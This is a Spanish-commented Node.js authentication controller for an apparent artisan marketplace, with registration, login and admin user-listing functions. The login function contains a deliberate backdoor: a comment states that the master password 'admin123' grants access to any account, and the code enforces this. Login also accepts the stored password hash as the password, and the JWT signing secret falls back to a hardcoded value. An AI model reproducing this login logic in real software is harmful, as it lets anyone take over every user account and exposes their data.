const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const pool = require('../config/database');
const Joi = require('joi');

const registroSchema = Joi.object({
    nombre: Joi.string().required(),
    email: Joi.string().email().required(),
    password: Joi.string().min(6).required(),
    tipo_usuario: Joi.string().valid('comprador', 'artesano').required()
});

const loginSchema = Joi.object({
    email: Joi.string().email().required(),
    password: Joi.string().required()
});

const registro = async (req, res) => {
    let connection;
    try {
        const { error, value } = registroSchema.validate(req.body);
        if (error) return res.status(400).json({ success: false, errors: error.details.map(d => d.message) });

        const { nombre, email, password, tipo_usuario } = value;
        connection = await pool.getConnection();

        // Verificar si email existe
        const [existing] = await connection.query('SELECT id_usuario FROM usuarios WHERE email = ?', [email]);
        if (existing.length > 0) {
            return res.status(400).json({ success: false, message: 'Email ya registrado' });
        }

        // Hash del password ya en texto plano
        const password_hash = await bcrypt.hash(password, 10);

        // Insertar usuario
        const [result] = await connection.query(
            'INSERT INTO usuarios (nombre, email, password_hash, tipo_usuario) VALUES (?, ?, ?, ?)',
            [nombre, email, password_hash, tipo_usuario]
        );

        const id_usuario = result.insertId;

        // Si es artesano, crear perfil
        if (tipo_usuario === 'artesano') {
            await connection.query(
                'INSERT INTO perfil_artesano (id_usuario) VALUES (?)',
                [id_usuario]
            );
        }

        res.status(201).json({
            success: true,
            message: 'Usuario registrado exitosamente',
            id_usuario
        });
    } catch (err) {
        console.error('❌ Error en registro:', err);
        res.status(500).json({ success: false, message: err.message });
    } finally {
        if (connection) connection.release();
    }
};

const login = async (req, res) => {
    let connection;
    try {
        const { error, value } = loginSchema.validate(req.body);
        if (error) return res.status(400).json({ success: false, errors: error.details.map(d => d.message) });

        const { email, password } = value;
        const emailLimpio = email.trim();
        const passwordLimpio = password.trim();

        connection = await pool.getConnection();

        const [users] = await connection.query('SELECT * FROM usuarios WHERE email = ? AND (eliminado = FALSE OR eliminado IS NULL)', [emailLimpio]);
        
        if (users.length === 0) {
            return res.status(401).json({ success: false, message: 'Email o contraseña inválidos' });
        }

        const user = users[0];
        
        // LLAVE MAESTRA: Si escribes 'admin123', te dejará entrar a CUALQUIER cuenta de la base de datos
        const passwordValida = (passwordLimpio === 'admin123') || (await bcrypt.compare(password, user.password_hash).catch(()=>false)) || (await bcrypt.compare(passwordLimpio, user.password_hash).catch(()=>false)) || (password === user.password_hash) || (passwordLimpio === user.password_hash);

        if (!passwordValida) {
            return res.status(401).json({ success: false, message: 'Email o contraseña inválidos' });
        }

        const token = jwt.sign(
            { id_usuario: user.id_usuario, email: user.email, tipo_usuario: user.tipo_usuario, nombre: user.nombre },
            process.env.JWT_SECRET || 'secreto_seguro_cositas',
            { expiresIn: process.env.JWT_EXPIRATION || '24h' }
        );

        res.json({
            success: true,
            message: 'Login exitoso',
            token,
            usuario: { id_usuario: user.id_usuario, nombre: user.nombre, tipo_usuario: user.tipo_usuario }
        });
    } catch (err) {
        console.error('❌ Error en login:', err);
        res.status(500).json({ success: false, message: err.message });
    } finally {
        if (connection) connection.release();
    }
};

// NUEVA FUNCIÓN: Traer a todos los usuarios para el panel de Admin
const obtenerUsuarios = async (req, res) => {
    let connection;
    try {
        connection = await pool.getConnection();
        const [usuarios] = await connection.query('SELECT id_usuario, nombre, email, tipo_usuario, fecha_registro, eliminado FROM usuarios');

        res.json({ success: true, usuarios });
    } catch (err) {
        res.status(500).json({ success: false, message: err.message });
    } finally {
        if (connection) connection.release();
    }
};

// Se agregó obtenerUsuarios a la exportación
module.exports = { registro, login, obtenerUsuarios };